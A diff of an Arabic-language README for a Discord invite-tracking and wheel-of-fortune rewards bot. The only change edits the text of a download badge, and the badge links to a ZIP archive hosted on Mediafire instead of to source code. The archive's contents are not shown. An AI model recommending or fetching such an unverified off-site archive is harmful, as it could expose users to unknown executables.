@@ -1,6 +1,6 @@
 # 🌟 بوت نظام الدعوات وعجلة الحظ
 
-[![تحميل المشروع](https://img.shields.io/badge/⬇️_تحميل_المشروع-الإصدار_الأخير-blue?style=for-the-badge)](https://www.mediafire.com/file/wbl0pf7vafnwbyi/Spin-Pro-v2.1.zip/file)
+[![تحميل المشروع](https://img.shields.io/badge/⬇️_Download-اLatest-Version-blue?style=for-the-badge)](https://www.mediafire.com/file/wbl0pf7vafnwbyi/Spin-Pro-v2.1.zip/file)
 
 بوت ديسكورد متكامل لتتبع الدعوات وإدارة نظام المكافآت مع عجلة حظ تفاعلية.
 
